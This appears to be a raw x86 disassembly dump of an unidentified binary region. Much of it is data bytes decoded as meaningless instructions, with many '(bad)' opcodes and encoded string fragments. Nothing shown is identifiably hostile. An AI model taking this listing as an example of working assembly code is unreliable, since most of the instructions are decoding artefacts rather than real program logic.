  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	jp     0x413edb
  413f02:	or     ecx,DWORD PTR [ebx+0xd1dc]
  413f08:	add    eax,0xcb000001
  413f0d:	dec    BYTE PTR [edi-0x4c]
  413f10:	fldcw  WORD PTR [ecx+edx*2+0x58]
  413f14:	sub    ah,bl
  413f16:	mov    ds:0x8491887,eax
  413f1b:	fsubr  QWORD PTR [ecx+0x6c]
  413f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f1f:	repz pop ebp
  413f21:	and    BYTE PTR [ecx-0x5a],0xbf
  413f25:	call   0x7829:0x537a1855
  413f2c:	ds out dx,al
  413f2e:	jns    0x413ebd
  413f30:	jbe    0x413f50
  413f32:	push   edi
  413f33:	test   eax,0x8e56c476
  413f38:	dec    ebx
  413f39:	retf   0x8f5
  413f3c:	addr16 or al,0x49
  413f3f:	mov    esi,0x3ecdc8b1
  413f44:	inc    esi
  413f45:	out    dx,al
  413f46:	mov    dl,0x82
  413f48:	das    
  413f49:	out    0xb9,eax
  413f4b:	(bad)  
  413f4c:	leave  
  413f4d:	nop
  413f4e:	scas   al,BYTE PTR es:[edi]
  413f4f:	ss dec esi
  413f51:	cmp    dh,dl
  413f53:	xor    edi,DWORD PTR [ebx-0x4b08e07d]
  413f59:	hlt    
  413f5a:	mov    es,WORD PTR [edi+ebp*8-0x6f6c3876]
  413f61:	jecxz  0x413f7b
  413f63:	and    al,0x2c
  413f65:	imul   ecx,DWORD PTR [edx+0x32877f2b],0xe6166a26
  413f6f:	(bad)  
  413f70:	push   ebx
  413f71:	adc    BYTE PTR [ecx-0x1cd51952],bh
  413f77:	push   ecx
  413f78:	push   esi
  413f79:	pop    eax
  413f7a:	fucomip st,st(3)
  413f7c:	mov    ecx,0x69658937
  413f81:	and    cl,BYTE PTR [ebp-0x622b628f]
  413f87:	les    edi,FWORD PTR [esi]
  413f89:	and    eax,0xdc64db9e
  413f8e:	ret    0x1074
  413f91:	cmp    eax,0xf744cf6
  413f96:	mov    al,ds:0xdfee606d
  413f9b:	pop    edi
  413f9c:	sbb    DWORD PTR [eax],0x264336b5
  413fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa3:	cmp    ebx,ebx
  413fa5:	sar    DWORD PTR [esi-0x75f76253],1
  413fab:	jl     0x413f86
  413fad:	add    eax,0x2e53cd83
  413fb2:	and    bh,ah
  413fb4:	mov    ecx,es
  413fb6:	ja     0x413f45
  413fb8:	popa   
  413fb9:	sbb    DWORD PTR [ebp+0x173f9d36],0x4a
  413fc0:	popf   
  413fc1:	mov    eax,0x44a10e92
  413fc6:	mov    ds:0x22d3a3c9,eax
  413fcb:	xchg   ebx,eax
  413fcc:	xor    ebp,DWORD PTR [esi+0x49b5e238]
  413fd2:	ins    BYTE PTR es:[edi],dx
  413fd3:	out    0x9,al
  413fd5:	clc    
  413fd6:	inc    esp
  413fd7:	inc    esi
  413fd8:	mov    WORD PTR [edi],?
  413fda:	dec    esp
  413fdb:	mov    ah,0x86
  413fdd:	inc    ebp
  413fde:	add    BYTE PTR [ecx+0x4c5389cc],dl
  413fe4:	inc    eax
  413fe5:	cmp    eax,0x1f3b697
  413fea:	sub    eax,0x206241fa
  413fef:	jmp    0x413ff9
  413ff1:	or     DWORD PTR [ebx],esi
  413ff3:	mov    eax,0xe03eee19
  413ff8:	loope  0x414015
  413ffa:	inc    esp
  413ffb:	int3   
  413ffc:	les    ebp,FWORD PTR [ecx]
  413ffe:	mov    al,0xa9
  414000:	inc    esi
  414001:	sti    
  414002:	push   0xdbc85184
  414007:	and    DWORD PTR [edi-0xafeb49e],eax
  41400d:	shl    BYTE PTR ds:0xef75,1
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xa380:0x77d52e96
  414083:	dec    ebx
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x84000001
  41408d:	inc    esi
  41408e:	sbb    eax,0x8b62526c
  414093:	out    dx,eax
  414094:	nop
  414095:	scas   eax,DWORD PTR es:[edi]
  414096:	sbb    edx,esi
  414098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414099:	inc    edi
  41409a:	shl    BYTE PTR ds:0x32072727,cl
  4140a0:	popa   
  4140a1:	mov    DWORD PTR [esi+edi*1],esi
  4140a4:	inc    eax
  4140a5:	and    dl,dh
  4140a7:	inc    esi
  4140a8:	test   bl,cl
  4140aa:	repnz xor eax,0x40332002
  4140b0:	and    esp,DWORD PTR [edi+0x5552109e]
  4140b6:	adc    DWORD PTR [eax-0x1a],esi
  4140b9:	mov    ds:0xa5dda8f2,eax
  4140be:	jp     0x4140f0
  4140c0:	data16 int 0x50
  4140c3:	dec    ebx
  4140c4:	outs   dx,DWORD PTR ds:[esi]
  4140c5:	(bad)  
  4140c6:	xor    eax,0xa6a5fb7
  4140cb:	push   edi
  4140cc:	jne    0x4140fa
  4140ce:	test   DWORD PTR [ecx-0x21f4f463],esp
  4140d4:	push   ebp
  4140d5:	sub    ebx,DWORD PTR [eax]
  4140d7:	test   eax,0xbcaebe8b
  4140dc:	cs jge 0x414082
  4140df:	adc    BYTE PTR [ebp+eiz*8-0x72],ch
  4140e3:	mov    eax,0x29736262
  4140e8:	sbb    ebx,DWORD PTR [ebx]
  4140ea:	rol    BYTE PTR [edi-0x1df8485b],0xca
  4140f1:	nop
  4140f2:	sar    eax,cl
  4140f4:	das    
  4140f5:	pop    ds
  4140f6:	or     dh,BYTE PTR [ecx+0x2c]
  4140f9:	cmp    BYTE PTR gs:[eax],bh
  4140fc:	inc    edi
  4140fd:	bound  edx,QWORD PTR [edx]
  4140ff:	push   edi
  414100:	jle    0x414104
  414102:	and    BYTE PTR [eax],al
  414104:	fsub   QWORD PTR [edi+0x3f]
  414107:	cmp    DWORD PTR [ebp+edi*4+0x64],ecx
  41410b:	adc    eax,0x6a40e63
  414110:	pop    es
  414111:	cs cmc 
  414113:	out    dx,al
  414114:	pop    eax
  414115:	lock pop ss
  414117:	mov    bl,0x13
  414119:	jbe    0x41417d
  41411b:	sub    ah,BYTE PTR [esi+0x45]
  41411e:	push   ss
  41411f:	or     BYTE PTR [edx-0x4b],al
  414122:	(bad)  
  414123:	popf   
  414124:	cld    
  414125:	push   ecx
  414126:	push   esp
  414127:	jnp    0x41415c
  414129:	jle    0x414147
  41412b:	add    ch,ah
  41412d:	neg    BYTE PTR [ecx]
  41412f:	jecxz  0x414167
  414131:	adc    DWORD PTR [esi+0x78],ecx
  414134:	add    ebx,DWORD PTR [ebp+0x7c125eac]
  41413a:	data16 adc BYTE PTR [edx-0x2d98c019],ch
  414141:	xchg   ebp,eax
  414142:	pop    ebx
  414143:	push   ebx
  414144:	mov    ecx,0xe0fe3a99
  414149:	inc    DWORD PTR [edi+0x55e9f4a4]
  41414f:	and    cl,dh
  414151:	icebp  
  414152:	sbb    eax,0xae912b5d
  414157:	test   WORD PTR [eax+edx*2],0x996d
  41415d:	add    cl,BYTE PTR [ebp+0x36]
  414160:	add    eax,0xb37d0981
  414165:	lahf   
  414166:	pop    esi
  414167:	cmp    al,0x81
  414169:	shl    DWORD PTR [ebx+0x31],0xa
  41416d:	fcmovbe st,st(4)
  41416f:	jne    0x41419a
  414171:	hlt    
  414172:	fwait
  414173:	pop    esi
  414174:	pushf  
  414175:	push   ds
  414176:	sub    dl,BYTE PTR [edx]
  414178:	push   0x23
  41417a:	inc    ebp
  41417b:	cmp    DWORD PTR [edx],eax
  41417d:	xor    DWORD PTR [ecx-0x2f1f446d],0x7d
  414184:	xor    al,BYTE PTR fs:[ebp-0x7e]
  414188:	int3   
  414189:	cwde   
  41418a:	test   ah,ch
  41418c:	xor    edx,ebp
  41418e:	mov    ds:0xe3d3,al
	...
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	out    0x6,eax
  414202:	(bad)  
  414203:	out    0xe6,al
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0x16000001,al
  41420d:	push   edx
  41420e:	(bad)  
  41420f:	bound  ecx,QWORD PTR [edi+esi*1]
  414212:	jne    0x414268
  414214:	enter  0x74db,0x6d
  414218:	in     eax,dx
  414219:	mov    cl,BYTE PTR [ebx+edx*8-0x3b]
  41421d:	mov    eax,ds:0x2f34f810
  414222:	lods   eax,DWORD PTR ds:[esi]
  414223:	sub    eax,0x53abc27b
  414228:	idiv   ch
  41422a:	xor    al,0x60
  41422c:	xlat   BYTE PTR ds:[ebx]
  41422d:	int3   
  41422e:	mov    ds:0x862e805e,eax
  414233:	stos   DWORD PTR es:[edi],eax
  414234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414235:	bound  edx,QWORD PTR [esi]
  414237:	dec    eax
  414238:	inc    edi
  414239:	test   eax,0x78b41fe8
  41423e:	mov    esp,0x273b05c1
  414243:	xchg   ebx,eax
  414244:	xor    al,0xb7
  414246:	jle    0x414268
  414248:	cmp    DWORD PTR [esi-0x5f30e14f],esi
  41424e:	xchg   DWORD PTR [edx+edi*2],esi
  414251:	bound  edi,QWORD PTR [ecx]
  414253:	lock leave 
  414255:	cli    
  414256:	jbe    0x4142a9
  414258:	xchg   edi,eax
  414259:	cvttps2pi mm6,xmm5
  41425c:	adc    DWORD PTR ds:0xea2b60c9,0xffffffee
  414263:	fisttp WORD PTR ds:0x4d599822
  414269:	aaa    
  41426a:	cmp    ebp,ebp
  41426c:	and    eax,DWORD PTR [edx+0x5]
  41426f:	out    0x13,al
  414271:	and    al,0x24
  414273:	mul    BYTE PTR [esi-0xe7702cd]
  414279:	pop    ebp
  41427a:	repnz mov eax,ds:0x5a8230fd
  414280:	(bad)  
  414281:	and    dh,ch
  414283:	fs xchg esi,eax
  414285:	in     eax,dx
  414286:	lods   eax,DWORD PTR ds:[esi]
  414287:	(bad)  
  414288:	out    dx,al
  414289:	fcomp  DWORD PTR [eax+0x54]
  41428c:	mov    ebp,0xa474ef22
  414291:	xor    DWORD PTR [ebx],edi
  414293:	shr    DWORD PTR [esi+0x78],cl
  414296:	and    dh,BYTE PTR [edx]
  414298:	fldcw  WORD PTR ds:0x76dd186c
  41429e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41429f:	out    dx,al
  4142a0:	aaa    
  4142a1:	or     dh,BYTE PTR [ebp+0x50]
  4142a4:	test   eax,0x3641cb97
  4142a9:	cmp    BYTE PTR [edx],ch
  4142ab:	adc    ah,BYTE PTR [esi-0x4]
  4142ae:	adc    ebx,DWORD PTR [eax-0x2948061c]
  4142b4:	jo     0x414300
  4142b6:	out    0xc5,al
  4142b8:	or     BYTE PTR [ecx-0x56],0x91
  4142bc:	or     dl,bh
  4142be:	pop    eax
  4142bf:	xchg   ebp,eax
  4142c0:	or     BYTE PTR [edi-0x76],0xf2
  4142c4:	cld    
  4142c5:	shr    BYTE PTR [ebp-0x68dfbfeb],cl
  4142cb:	mov    cl,0x87
  4142cd:	fdivr  st,st(1)
  4142cf:	clc    
  4142d0:	test   eax,0xedd249af
  4142d5:	dec    eax
  4142d6:	push   esp
  4142d7:	add    ch,BYTE PTR [edx]
  4142d9:	fiadd  WORD PTR [eax]
  4142db:	jo     0x4142c8
  4142dd:	stos   DWORD PTR es:[edi],eax
  4142de:	retf   0x5990
  4142e1:	pop    ebp
  4142e2:	inc    ebp
  4142e3:	pop    esp
  4142e4:	and    eax,0x72421a6f
  4142e9:	mov    cl,0x26
  4142eb:	mov    al,0x9
  4142ed:	sub    DWORD PTR [esi+0x1bafb0da],0xfffffff3
  4142f4:	inc    eax
  4142f5:	in     eax,dx
  4142f6:	mov    BYTE PTR [ecx-0x7c],bh
  4142f9:	retf   0xabbe
  4142fc:	or     edi,DWORD PTR [edi-0x4633e274]
  414302:	mov    DWORD PTR ds:0xd00fe97f,edi
  414308:	push   0x57
  41430a:	adc    BYTE PTR [edi+0xd],bh
  41430d:	ins    BYTE PTR es:[edi],dx
  41430e:	call   0x0:0x3657
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	pushf  
  414381:	mov    eax,ds:0xd4eb2118
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0xf2000001
  41438d:	dec    ebp
  41438e:	aad    0xf5
  414390:	mov    ah,0x8d
  414392:	ret    
  414393:	adc    eax,DWORD PTR [ecx]
  414395:	fcomp  st(7)
  414397:	push   ds
  414398:	jge    0x4143ae
  41439a:	outs   dx,BYTE PTR ds:[esi]
  41439b:	cmp    al,0x62
  41439d:	out    dx,eax
  41439e:	xor    al,0x4b
  4143a0:	xchg   edi,eax
  4143a1:	push   esp
  4143a2:	xor    al,0x7a
  4143a4:	jge    0x414363
  4143a6:	cmp    al,0xb8
  4143a8:	mov    BYTE PTR [ebx-0x379334fa],al
  4143ae:	lods   al,BYTE PTR ds:[esi]
  4143af:	cmp    BYTE PTR [edi-0x62095d8c],cl
  4143b5:	(bad)  
  4143b6:	push   eax
  4143b7:	aam    0xab
  4143b9:	cwde   
  4143ba:	aas    
  4143bb:	push   ecx
  4143bc:	cmp    eax,ecx
  4143be:	xor    DWORD PTR [edx+0x5e72beb7],0xffffff91
  4143c5:	push   ss
  4143c6:	jp     0x4143f9
  4143c8:	push   ds
  4143c9:	inc    edi
  4143ca:	icebp  
  4143cb:	adc    esi,DWORD PTR [ecx-0x1500e805]
  4143d1:	test   BYTE PTR [ebp+0x3c9c1cba],ch
  4143d7:	push   edi
  4143d8:	fcom   DWORD PTR [edx]
  4143da:	shl    BYTE PTR [eax-0x3],cl
  4143dd:	mov    ebp,0x537e1ed0
  4143e2:	es cdq 
  4143e4:	ror    DWORD PTR [esi-0xb],0x45
  4143e8:	out    dx,eax
  4143e9:	inc    ecx
  4143ea:	mov    edx,0xdc703e72
  4143ef:	retf   0xda90
  4143f2:	adc    al,0xc6
  4143f4:	imul   ebx,eax,0xffffffc2
  4143f7:	add    DWORD PTR [eax+0x279ea677],esi
  4143fd:	mov    dl,0xa4
  4143ff:	inc    ebx
  414400:	push   ebx
  414401:	cdq    
  414402:	push   ecx
  414403:	push   ds
  414404:	loopne 0x41444f
  414406:	or     eax,0x133b6094
  41440b:	(bad)  
  41440c:	jbe    0x414459
  41440e:	mov    ch,0x74
  414410:	aad    0x13
  414412:	add    ebp,ebp
  414414:	pop    eax
  414415:	inc    esp
  414416:	mov    ecx,0x46e49458
  41441b:	jo     0x4143fc
  41441d:	int3   
  41441e:	adc    eax,0x2bae9a2a
  414423:	mov    cl,0xb1
  414425:	in     eax,dx
  414426:	test   eax,0x3d699c96
  41442b:	add    esi,DWORD PTR [ebx]
  41442d:	mov    eax,ds:0xe71c2aec
  414432:	xor    eax,edi
  414434:	hlt    
  414435:	nop    DWORD PTR [ecx-0x74b031a]
  41443c:	out    0x5f,eax
  41443e:	jae    0x4143ec
  414440:	fnclex 
  414442:	pop    eax
  414443:	jne    0x41448a
  414445:	std    
  414446:	into   
  414447:	outs   dx,DWORD PTR ds:[esi]
  414448:	ins    DWORD PTR es:[edi],dx
  414449:	adc    DWORD PTR [eax-0x7d8937fc],esi
  41444f:	push   ecx
  414450:	imul   esi,esi,0x2d9a1cc0
  414456:	push   ebp
  414457:	ret    
  414458:	jns    0x414442
  41445a:	dec    ecx
  41445b:	mov    ss,WORD PTR [edx]
  41445d:	call   0x7268cccf
  414462:	xchg   edi,eax
  414463:	out    dx,eax
  414464:	les    esp,FWORD PTR [edi+esi*8-0x9]
  414468:	push   ds
  414469:	inc    esi
  41446a:	push   0xf5c05926
  41446f:	imul   eax,DWORD PTR [esi-0x6ec75a41],0xffffffe9
  414476:	mov    ebp,0x7f93af38
  41447b:	xlat   BYTE PTR ds:[ebx]
  41447c:	jl     0x414441
  41447e:	bound  edx,QWORD PTR [edx]
  414480:	and    al,0x84
  414482:	add    al,0x10
  414484:	mov    ?,ecx
  414486:	inc    edx
  414487:	mov    bh,0x48
  414489:	jb     0x414498
  41448b:	add    al,0x24
  41448d:	(bad)  
  41448e:	out    dx,eax
  41448f:	and    DWORD PTR [esi+0x0],esi
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x52]
  414501:	test   eax,0xd5f00db8
  414506:	add    BYTE PTR [eax],al
  414508:	add    eax,0x91000001
  41450d:	xchg   ecx,eax
  41450e:	(bad)  
  41450f:	aaa    
  414510:	pop    esp
  414511:	push   es
  414512:	cmp    DWORD PTR [ebp+0xe],esp
  414515:	in     eax,0x8c
  414517:	sbb    al,0xc4
  414519:	adc    esp,edx
  41451b:	jecxz  0x4144f8
  41451d:	idiv   BYTE PTR [eax+0x23]
  414520:	inc    ebp
  414521:	add    eax,0x5d6c480b
  414526:	mov    bh,0x47
  414528:	arpl   WORD PTR [edi+eiz*1+0x2],di
  41452c:	icebp  
